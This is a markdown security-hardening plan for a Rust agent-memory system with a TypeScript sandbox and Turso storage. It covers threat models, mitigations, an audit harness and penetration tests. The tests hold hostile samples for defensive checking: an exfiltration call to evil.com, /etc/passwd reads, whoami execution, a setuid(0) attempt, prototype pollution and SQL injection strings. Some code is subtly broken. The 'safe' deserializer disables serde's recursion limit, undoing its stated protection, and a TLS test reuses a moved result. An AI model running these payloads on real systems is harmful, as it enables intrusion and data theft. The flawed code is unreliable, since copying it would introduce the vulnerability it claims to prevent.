# PHASE 5: SECURE 🔒

> **Goal**: Comprehensive security hardening, threat mitigation, and vulnerability elimination through systematic security analysis and testing.

## Overview

This phase ensures the system is secure against known attack vectors, follows security best practices, and maintains defense-in-depth principles.

## Cognitive Layer: Security Analysis

### Attack Surface Analysis

#### 1. MCP Code Execution Attack Surface

**Description**: Untrusted TypeScript code execution in sandbox environment.

**Attack Vectors**:
- Sandbox escape via Node.js vulnerabilities
- Resource exhaustion (CPU, memory, disk)
- File system access outside sandbox
- Network access to internal services
- Prototype pollution attacks

**Risk Level**: **HIGH** - Code execution is inherently dangerous

**Mitigations**:
```rust
pub struct SandboxSecurityConfig {
    // Process isolation
    pub use_separate_process: bool,              // Always true
    pub process_uid: Option<u32>,                // Drop privileges

    // Resource limits
    pub max_execution_time: Duration,            // 5 seconds default
    pub max_memory_mb: usize,                    // 128MB default
    pub max_cpu_percent: f32,                    // 50% default

    // File system restrictions
    pub allowed_paths: Vec<PathBuf>,             // Whitelist only
    pub read_only_mode: bool,                    // True by default

    // Network restrictions
    pub block_network_access: bool,              // True by default
    pub allowed_domains: Vec<String>,            // Empty by default

    // Code validation
    pub validate_imports: bool,                  // Check required modules
    pub disallow_dangerous_apis: bool,           // Block eval, Function, etc.
}
```

#### 2. Database Injection Attack Surface

**Description**: SQL injection via Turso queries with user-provided data.

**Attack Vectors**:
- SQL injection in episode descriptions
- JSON injection in context fields
- NoSQL injection in metadata queries

**Risk Level**: **MEDIUM** - Parameterized queries reduce risk

**Mitigations**:
```rust
// ALWAYS use parameterized queries
pub async fn store_episode_safe(&self, episode: &Episode) -> Result<()> {
    // ✅ GOOD: Parameterized
    self.client.execute(
        "INSERT INTO episodes (episode_id, task_description, context) VALUES (?, ?, ?)",
        params![
            episode.episode_id.to_string(),
            episode.task_description,  // Cannot inject here
            serde_json::to_string(&episode.context)?
        ],
    ).await?;

    Ok(())
}

// ❌ BAD: String concatenation (NEVER DO THIS)
pub async fn store_episode_unsafe(&self, episode: &Episode) -> Result<()> {
    let query = format!(
        "INSERT INTO episodes (task_description) VALUES ('{}')",
        episode.task_description  // VULNERABLE!
    );
    self.client.execute(&query, []).await?;
    Ok(())
}

// Input validation
pub fn validate_episode_input(episode: &Episode) -> Result<()> {
    // Limit field sizes
    if episode.task_description.len() > 10_000 {
        return Err(Error::InputTooLarge("task_description"));
    }

    // Validate JSON fields
    serde_json::to_string(&episode.context)
        .map_err(|_| Error::InvalidInput("context"))?;

    Ok(())
}
```

#### 3. Memory Exhaustion Attack Surface

**Description**: Large episode data causing out-of-memory conditions.

**Attack Vectors**:
- Extremely large episode descriptions
- Huge metadata blobs
- Massive step arrays
- Large pattern datasets

**Risk Level**: **MEDIUM** - Can cause denial of service

**Mitigations**:
```rust
pub struct ResourceLimits {
    pub max_episode_description_bytes: usize,   // 10KB
    pub max_context_fields: usize,              // 50 fields
    pub max_steps_per_episode: usize,           // 1000 steps
    pub max_metadata_bytes: usize,              // 1MB
    pub max_total_episode_bytes: usize,         // 10MB
}

impl ResourceLimits {
    pub fn validate_episode(&self, episode: &Episode) -> Result<()> {
        // Check description size
        if episode.task_description.len() > self.max_episode_description_bytes {
            return Err(Error::ResourceLimitExceeded("episode_description"));
        }

        // Check step count
        if episode.steps.len() > self.max_steps_per_episode {
            return Err(Error::ResourceLimitExceeded("steps"));
        }

        // Check total size
        let total_size = bincode::serialized_size(episode)?;
        if total_size as usize > self.max_total_episode_bytes {
            return Err(Error::ResourceLimitExceeded("total_episode_size"));
        }

        Ok(())
    }
}
```

#### 4. Serialization Attack Surface

**Description**: Malformed JSON/bincode data causing deserialization vulnerabilities.

**Attack Vectors**:
- Crafted JSON causing parser exploits
- Bincode deserialization gadget chains
- Type confusion attacks
- Stack overflow via deeply nested structures

**Risk Level**: **LOW** - Rust's type system provides protection

**Mitigations**:
```rust
use serde::{Deserialize, Serialize};
use serde_json::Value;

pub fn deserialize_episode_safe(data: &[u8]) -> Result<Episode> {
    // Limit nesting depth
    let mut deserializer = serde_json::Deserializer::from_slice(data);
    deserializer.disable_recursion_limit(); // Use manual checking instead

    // Limit size
    if data.len() > 10_000_000 {  // 10MB max
        return Err(Error::DataTooLarge);
    }

    // Parse with strict validation
    let episode: Episode = serde_path_to_error::deserialize(&mut deserializer)
        .map_err(|e| Error::DeserializationError(e.to_string()))?;

    // Additional validation
    ResourceLimits::default().validate_episode(&episode)?;

    Ok(episode)
}
```

#### 5. Network Attack Surface

**Description**: Man-in-the-middle attacks on Turso connections.

**Attack Vectors**:
- SSL/TLS downgrade attacks
- Certificate validation bypass
- Eavesdropping on unencrypted connections

**Risk Level**: **MEDIUM** - Turso uses HTTPS but validation is critical

**Mitigations**:
```rust
pub struct SecureTursoConfig {
    pub url: String,
    pub token: String,
    pub enforce_tls: bool,                    // Always true
    pub validate_certificates: bool,          // Always true
    pub pin_certificates: Option<Vec<Vec<u8>>>, // Optional cert pinning
    pub min_tls_version: TlsVersion,          // TLS 1.3 minimum
}

impl TursoStorage {
    pub async fn new_secure(config: SecureTursoConfig) -> Result<Self> {
        // Enforce HTTPS
        if !config.url.starts_with("https://") && !config.url.starts_with("libsql://") {
            return Err(Error::InsecureConnection("URL must use HTTPS"));
        }

        // Configure TLS
        let client = libsql::Builder::new_remote(config.url, config.token)
            .build()
            .await?;

        Ok(Self { client: client.connect()? })
    }
}
```

### Threat Modeling

```rust
#[derive(Debug, Clone)]
pub enum SecurityThreat {
    CodeInjection {
        payload: String,
        severity: ThreatLevel,
        vector: AttackVector,
    },
    DatabaseInjection {
        query: String,
        severity: ThreatLevel,
        vector: AttackVector,
    },
    MemoryExhaustion {
        size: usize,
        severity: ThreatLevel,
        vector: AttackVector,
    },
    DeserializationAttack {
        data: Vec<u8>,
        severity: ThreatLevel,
        vector: AttackVector,
    },
    NetworkInterception {
        connection: String,
        severity: ThreatLevel,
        vector: AttackVector,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ThreatLevel {
    Low,       // Information disclosure, minor DoS
    Medium,    // Service disruption, data corruption
    High,      // System compromise, privilege escalation
    Critical,  // Data breach, remote code execution
}

#[derive(Debug, Clone)]
pub enum AttackVector {
    UserInput,
    NetworkData,
    StoredData,
    CodeExecution,
}

impl SecurityThreat {
    pub fn assess_risk(&self) -> RiskAssessment {
        let severity = self.severity();
        let likelihood = self.estimate_likelihood();

        RiskAssessment {
            threat: self.clone(),
            severity,
            likelihood,
            risk_score: Self::calculate_risk_score(severity, likelihood),
        }
    }

    fn severity(&self) -> ThreatLevel {
        match self {
            Self::CodeInjection { severity, .. } => *severity,
            Self::DatabaseInjection { severity, .. } => *severity,
            Self::MemoryExhaustion { severity, .. } => *severity,
            Self::DeserializationAttack { severity, .. } => *severity,
            Self::NetworkInterception { severity, .. } => *severity,
        }
    }

    fn estimate_likelihood(&self) -> Likelihood {
        // Based on attack surface exposure and mitigations
        match self {
            Self::CodeInjection { .. } => Likelihood::Medium,  // Sandboxed but exposed
            Self::DatabaseInjection { .. } => Likelihood::Low, // Parameterized queries
            Self::MemoryExhaustion { .. } => Likelihood::Low,  // Resource limits
            Self::DeserializationAttack { .. } => Likelihood::VeryLow, // Rust type safety
            Self::NetworkInterception { .. } => Likelihood::VeryLow,  // TLS enforced
        }
    }

    fn calculate_risk_score(severity: ThreatLevel, likelihood: Likelihood) -> f32 {
        let severity_score = match severity {
            ThreatLevel::Low => 1.0,
            ThreatLevel::Medium => 2.0,
            ThreatLevel::High => 3.0,
            ThreatLevel::Critical => 4.0,
        };

        let likelihood_score = match likelihood {
            Likelihood::VeryLow => 0.1,
            Likelihood::Low => 0.3,
            Likelihood::Medium => 0.5,
            Likelihood::High => 0.7,
            Likelihood::VeryHigh => 0.9,
        };

        severity_score * likelihood_score
    }
}
```

## Agentic Layer: Security Implementation

### Security Auditor: Comprehensive Security Testing

```rust
pub struct SecurityAuditor;

impl SecurityAuditor {
    pub async fn audit_system() -> SecurityAuditReport {
        let mut report = SecurityAuditReport::new();

        // Code execution sandbox audit
        report.add_section(Self::audit_code_execution_sandbox().await);

        // Database security audit
        report.add_section(Self::audit_database_security().await);

        // Input validation audit
        report.add_section(Self::audit_input_validation().await);

        // Cryptography audit
        report.add_section(Self::audit_cryptography().await);

        // Dependency audit
        report.add_section(Self::audit_dependencies().await);

        report
    }

    async fn audit_code_execution_sandbox() -> AuditSection {
        let mut threats = Vec::new();

        // Test file system access
        threats.push(Self::test_file_system_access());

        // Test network access restrictions
        threats.push(Self::test_network_access_restrictions());

        // Test process isolation
        threats.push(Self::test_process_isolation());

        // Test resource limits
        threats.push(Self::test_resource_limits());

        // Test privilege escalation
        threats.push(Self::test_privilege_escalation());

        AuditSection {
            name: "Code Execution Sandbox".to_string(),
            threats_identified: threats.iter().filter(|t| !t.blocked).count(),
            threats_mitigated: threats.iter().filter(|t| t.blocked).count(),
            details: threats,
        }
    }

    fn test_file_system_access() -> ThreatAssessment {
        let malicious_code = r#"
            const fs = require('fs');
            try {
                // Attempt to read sensitive file
                const passwd = fs.readFileSync('/etc/passwd', 'utf8');
                console.log('BREACH: File access successful');
                console.log(passwd.substring(0, 100));
            } catch (e) {
                console.log('File access properly blocked:', e.message);
            }
        "#;

        // Execute in sandbox
        let result = execute_in_sandbox(malicious_code);

        ThreatAssessment {
            threat_type: ThreatType::FileSystemAccess,
            blocked: !result.contains("BREACH"),
            evidence: result,
            recommendation: if result.contains("BREACH") {
                "CRITICAL: Implement file system restrictions".to_string()
            } else {
                "File system access properly restricted".to_string()
            },
        }
    }

    fn test_network_access_restrictions() -> ThreatAssessment {
        let malicious_code = r#"
            const https = require('https');
            try {
                https.get('https://evil.com/exfiltrate', (res) => {
                    console.log('BREACH: Network access successful');
                });
            } catch (e) {
                console.log('Network access properly blocked:', e.message);
            }
        "#;

        let result = execute_in_sandbox(malicious_code);

        ThreatAssessment {
            threat_type: ThreatType::NetworkAccess,
            blocked: !result.contains("BREACH"),
            evidence: result,
            recommendation: if result.contains("BREACH") {
                "HIGH: Implement network restrictions".to_string()
            } else {
                "Network access properly restricted".to_string()
            },
        }
    }

    fn test_process_isolation() -> ThreatAssessment {
        let malicious_code = r#"
            const { exec } = require('child_process');
            try {
                exec('whoami', (error, stdout, stderr) => {
                    if (!error) {
                        console.log('BREACH: Process execution successful:', stdout);
                    }
                });
            } catch (e) {
                console.log('Process execution properly blocked:', e.message);
            }
        "#;

        let result = execute_in_sandbox(malicious_code);

        ThreatAssessment {
            threat_type: ThreatType::ProcessExecution,
            blocked: !result.contains("BREACH"),
            evidence: result,
            recommendation: if result.contains("BREACH") {
                "CRITICAL: Implement process isolation".to_string()
            } else {
                "Process execution properly isolated".to_string()
            },
        }
    }

    fn test_resource_limits() -> ThreatAssessment {
        let malicious_code = r#"
            // Memory exhaustion attempt
            const bigArray = [];
            try {
                while (true) {
                    bigArray.push(new Array(1000000).fill('x'));
                }
            } catch (e) {
                console.log('Memory limit enforced:', e.message);
            }
        "#;

        let result = execute_in_sandbox_with_timeout(malicious_code, Duration::from_secs(5));

        ThreatAssessment {
            threat_type: ThreatType::ResourceExhaustion,
            blocked: result.contains("limit") || result.contains("timeout"),
            evidence: result,
            recommendation: "Resource limits appear to be enforced".to_string(),
        }
    }

    fn test_privilege_escalation() -> ThreatAssessment {
        let malicious_code = r#"
            const process = require('process');
            try {
                // Attempt to access process information
                console.log('UID:', process.getuid ? process.getuid() : 'N/A');
                console.log('GID:', process.getgid ? process.getgid() : 'N/A');

                // Attempt to change privileges
                if (process.setuid) {
                    process.setuid(0);
                    console.log('BREACH: Privilege escalation successful');
                }
            } catch (e) {
                console.log('Privilege operations blocked:', e.message);
            }
        "#;

        let result = execute_in_sandbox(malicious_code);

        ThreatAssessment {
            threat_type: ThreatType::PrivilegeEscalation,
            blocked: !result.contains("BREACH"),
            evidence: result,
            recommendation: "Verify process runs with minimal privileges".to_string(),
        }
    }

    async fn audit_database_security() -> AuditSection {
        let mut threats = Vec::new();

        // SQL injection tests
        threats.push(Self::test_sql_injection());

        // JSON injection tests
        threats.push(Self::test_json_injection());

        // Connection security
        threats.push(Self::test_connection_security());

        AuditSection {
            name: "Database Security".to_string(),
            threats_identified: threats.iter().filter(|t| !t.blocked).count(),
            threats_mitigated: threats.iter().filter(|t| t.blocked).count(),
            details: threats,
        }
    }

    fn test_sql_injection() -> ThreatAssessment {
        // Test various SQL injection payloads
        let payloads = vec![
            "'; DROP TABLE episodes; --",
            "' UNION SELECT * FROM episodes; --",
            "' OR '1'='1",
            "admin'--",
        ];

        let mut all_blocked = true;
        let mut evidence = String::new();

        for payload in payloads {
            let context = TaskContext {
                domain: payload.to_string(),
                ..Default::default()
            };

            // Attempt to store episode with malicious input
            match store_episode_with_context(&context) {
                Ok(_) => {
                    // Check if database was corrupted
                    if !verify_database_integrity() {
                        all_blocked = false;
                        evidence.push_str(&format!("BREACH with payload: {}\n", payload));
                    }
                }
                Err(_) => {
                    // Rejection is acceptable
                    evidence.push_str(&format!("Payload rejected: {}\n", payload));
                }
            }
        }

        ThreatAssessment {
            threat_type: ThreatType::SQLInjection,
            blocked: all_blocked,
            evidence,
            recommendation: if all_blocked {
                "SQL injection properly prevented with parameterized queries".to_string()
            } else {
                "CRITICAL: SQL injection vulnerability detected".to_string()
            },
        }
    }
}
```

### Compliance Checker: Security Standards Validation

```rust
pub struct ComplianceChecker;

impl ComplianceChecker {
    pub fn verify_security_standards() -> ComplianceReport {
        ComplianceReport {
            owasp_compliance: Self::check_owasp_top_10(),
            data_encryption: Self::verify_encryption_at_rest(),
            access_controls: Self::verify_authentication(),
            audit_logging: Self::verify_security_logging(),
            vulnerability_scanning: Self::check_dependencies(),
        }
    }

    fn check_owasp_top_10() -> Vec<ComplianceIssue> {
        vec![
            Self::check_injection_prevention(),           // A1
            Self::check_broken_authentication(),          // A2
            Self::check_sensitive_data_exposure(),        // A3
            Self::check_xxe(),                            // A4
            Self::check_broken_access_control(),          // A5
            Self::check_security_misconfiguration(),      // A6
            Self::check_xss(),                            // A7
            Self::check_insecure_deserialization(),       // A8
            Self::check_components_with_vulnerabilities(), // A9
            Self::check_insufficient_logging(),           // A10
        ]
    }

    fn check_injection_prevention() -> ComplianceIssue {
        // Verify all SQL queries use parameterized statements
        let issues = scan_codebase_for_string_concatenation_in_queries();

        ComplianceIssue {
            category: "A1 - Injection".to_string(),
            status: if issues.is_empty() {
                ComplianceStatus::Compliant
            } else {
                ComplianceStatus::NonCompliant
            },
            evidence: format!("Found {} potential injection points", issues.len()),
            recommendation: "Use parameterized queries for all database operations".to_string(),
        }
    }

    fn check_sensitive_data_exposure() -> ComplianceIssue {
        // Check for hardcoded credentials, tokens, etc.
        let secrets_found = scan_for_hardcoded_secrets();

        ComplianceIssue {
            category: "A3 - Sensitive Data Exposure".to_string(),
            status: if secrets_found.is_empty() {
                ComplianceStatus::Compliant
            } else {
                ComplianceStatus::NonCompliant
            },
            evidence: format!("Found {} potential secrets", secrets_found.len()),
            recommendation: "Use environment variables for all secrets".to_string(),
        }
    }

    fn check_insecure_deserialization() -> ComplianceIssue {
        // Check for unsafe deserialization patterns
        let unsafe_patterns = scan_for_unsafe_deserialization();

        ComplianceIssue {
            category: "A8 - Insecure Deserialization".to_string(),
            status: if unsafe_patterns.is_empty() {
                ComplianceStatus::Compliant
            } else {
                ComplianceStatus::Warning
            },
            evidence: "Using serde with size limits and validation".to_string(),
            recommendation: "Maintain input size limits and validation".to_string(),
        }
    }

    fn verify_encryption_at_rest() -> EncryptionComplianceResult {
        // Verify data encryption for sensitive fields
        EncryptionComplianceResult {
            database_encryption: true,   // Turso encrypts at rest
            file_system_encryption: true, // redb files should be encrypted
            in_transit_encryption: true,  // TLS for Turso connections
        }
    }

    fn check_dependencies() -> Vec<VulnerabilityReport> {
        // Run cargo-audit to check for known vulnerabilities
        let output = std::process::Command::new("cargo")
            .args(&["audit", "--json"])
            .output()
            .expect("Failed to run cargo audit");

        parse_cargo_audit_output(&output.stdout)
    }
}
```

### Penetration Tester: Attack Simulation

```rust
#[cfg(test)]
mod penetration_tests {
    use super::*;

    #[tokio::test]
    async fn pentest_sql_injection_resistance() {
        let memory = setup_memory().await;

        // Attempt SQL injection through episode description
        let malicious_input = "'; DROP TABLE episodes; --";
        let context = TaskContext {
            domain: malicious_input.to_string(),
            ..Default::default()
        };

        // Should not cause database corruption
        let result = memory.start_episode(malicious_input, context).await;
        assert!(result.is_ok(), "SQL injection caused error");

        // Verify database integrity
        let episode_count = memory.count_episodes().await.unwrap();
        let tables_exist = memory.verify_schema().await.unwrap();
        assert!(tables_exist, "Database was corrupted by injection");
    }

    #[tokio::test]
    async fn pentest_sandbox_escape() {
        let mcp_server = setup_mcp_server().await;

        // Attempt to escape sandbox and access host system
        let escape_attempts = vec![
            // Attempt 1: File system access
            r#"require('fs').readFileSync('/etc/passwd', 'utf8')"#,

            // Attempt 2: Process execution
            r#"require('child_process').execSync('whoami').toString()"#,

            // Attempt 3: Network access
            r#"require('https').get('https://evil.com')"#,

            // Attempt 4: Prototype pollution
            r#"
                const obj = {};
                obj.__proto__.polluted = 'yes';
                ({}).polluted;
            "#,

            // Attempt 5: Constructor access
            r#"
                const constructor = ''.constructor;
                constructor('return process')();
            "#,
        ];

        for (i, exploit) in escape_attempts.iter().enumerate() {
            let result = mcp_server.execute_agent_code(exploit, "{}".to_string()).await;

            match result {
                Ok(ExecutionResult::Success { output }) => {
                    // Verify no sensitive information leaked
                    assert!(
                        !output.contains("root"),
                        "Attempt {} leaked sensitive info: {}",
                        i,
                        output
                    );
                    assert!(
                        !output.contains("BREACH"),
                        "Attempt {} succeeded: {}",
                        i,
                        output
                    );
                }
                Ok(ExecutionResult::Error { .. }) => {
                    // Expected for security violations
                }
                Err(_) => {
                    // Expected for timeouts or rejections
                }
            }
        }
    }

    #[tokio::test]
    async fn pentest_memory_exhaustion() {
        let memory = setup_memory().await;

        // Attempt to create episodes with massive data
        let huge_string = "x".repeat(100_000_000); // 100MB

        let context = TaskContext {
            domain: huge_string.clone(),
            ..Default::default()
        };

        // Should be rejected or handled gracefully
        let result = memory.start_episode("memory attack", context).await;

        match result {
            Ok(_) => {
                // If accepted, verify system still responsive
                let health = memory.health_check().await;
                assert!(
                    health.is_ok(),
                    "System became unresponsive after large input"
                );
            }
            Err(e) => {
                // Rejection is acceptable
                assert!(
                    e.to_string().contains("size") || e.to_string().contains("limit"),
                    "Expected size-related error, got: {}",
                    e
                );
            }
        }
    }

    #[tokio::test]
    async fn pentest_deserialization_attacks() {
        let memory = setup_memory().await;

        // Crafted JSON with deeply nested structures
        let deeply_nested = generate_deeply_nested_json(10000); // 10K levels deep

        let result = serde_json::from_str::<TaskContext>(&deeply_nested);

        // Should either fail gracefully or enforce depth limits
        match result {
            Ok(_) => {
                // If parsing succeeds, verify reasonable depth
                panic!("Deeply nested JSON should be rejected");
            }
            Err(e) => {
                // Expected: recursion limit or size limit
                assert!(
                    e.to_string().contains("recursion")
                        || e.to_string().contains("limit")
                        || e.to_string().contains("too large")
                );
            }
        }
    }

    #[tokio::test]
    async fn pentest_authentication_bypass() {
        // Test Turso connection with invalid token
        let result = TursoStorage::new(
            "libsql://test.turso.io",
            "invalid_token_attempt_bypass",
        )
        .await;

        assert!(result.is_err(), "Invalid token should be rejected");

        // Test with expired token
        let expired_token = generate_expired_jwt();
        let result = TursoStorage::new("libsql://test.turso.io", &expired_token).await;

        assert!(result.is_err(), "Expired token should be rejected");
    }

    #[tokio::test]
    async fn pentest_race_conditions() {
        let memory = Arc::new(setup_memory().await);

        // Create episode
        let episode_id = memory
            .start_episode("Race test", test_context())
            .await
            .unwrap();

        // Attempt concurrent modifications
        let handles: Vec<_> = (0..100)
            .map(|i| {
                let mem = memory.clone();
                tokio::spawn(async move {
                    mem.log_step(episode_id, create_test_step(i)).await
                })
            })
            .collect();

        let results: Vec<_> = futures::future::join_all(handles).await;

        // All should succeed or fail gracefully (no panics)
        for result in results {
            assert!(result.is_ok(), "Task panicked");
        }

        // Verify data integrity
        let episode = memory.get_episode(episode_id).await.unwrap().unwrap();
        assert_eq!(
            episode.steps.len(),
            100,
            "Some steps were lost due to race condition"
        );
    }
}
```

### Authentication and Authorization Testing

```rust
#[cfg(test)]
mod auth_tests {
    use super::*;

    #[tokio::test]
    async fn test_turso_tls_enforcement() {
        // Verify TLS is required for Turso connections
        let result = TursoStorage::new("http://insecure.turso.io", "token").await;

        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("HTTPS") ||
            result.unwrap_err().to_string().contains("TLS")
        );
    }

    #[tokio::test]
    async fn test_certificate_validation() {
        // Test with self-signed certificate (should fail)
        let memory = setup_memory_with_self_signed_cert().await;

        let result = memory
            .start_episode("test", test_context())
            .await;

        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("certificate"));
    }

    #[tokio::test]
    async fn test_token_validation() {
        // Test with invalid token format
        let result = TursoStorage::new(
            "libsql://test.turso.io",
            "not_a_valid_token_format!@#$"
        ).await;

        assert!(result.is_err(), "Invalid token should be rejected");
    }

    #[tokio::test]
    async fn test_file_permissions() {
        use std::os::unix::fs::PermissionsExt;

        let temp_dir = TempDir::new().unwrap();
        let redb_path = temp_dir.path().join("test.redb");

        let _memory = SelfLearningMemory::new(
            "memory://",
            "",
            redb_path.to_str().unwrap()
        ).await.unwrap();

        // Check file permissions are restrictive
        let metadata = std::fs::metadata(&redb_path).unwrap();
        let permissions = metadata.permissions();
        let mode = permissions.mode();

        // Verify not readable by group/others (Unix-like systems)
        assert_eq!(
            mode & 0o077,
            0,
            "redb file has overly permissive permissions: {:o}",
            mode
        );
    }
}
```

## Security Complete Criteria

Before proceeding to Phase 6 (FEEDBACK LOOP), ensure:

- [ ] All attack vectors identified and mitigated
- [ ] Sandbox security tested and verified
- [ ] Database injection prevention validated
- [ ] Resource limits enforced and tested
- [ ] TLS/HTTPS enforced for all connections
- [ ] Certificate validation implemented
- [ ] Input validation comprehensive
- [ ] Penetration tests passing (no breaches)
- [ ] Dependency vulnerabilities resolved (cargo audit clean)
- [ ] Security audit report generated

## Next Steps

Once security hardening is complete:

1. ✅ Review security audit report
2. ✅ Address any remaining vulnerabilities
3. ✅ Document security controls and assumptions
4. ➡️ **Proceed to [Phase 6: FEEDBACK LOOP](./06-feedback-loop.md)** - Continuous improvement

## References

- [Phase 4: REVIEW](./04-review.md) - Quality assessment
- [Phase 6: FEEDBACK LOOP](./06-feedback-loop.md) - Next phase (iteration)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Rust Security Guidelines](https://anssi-fr.github.io/rust-guide/)
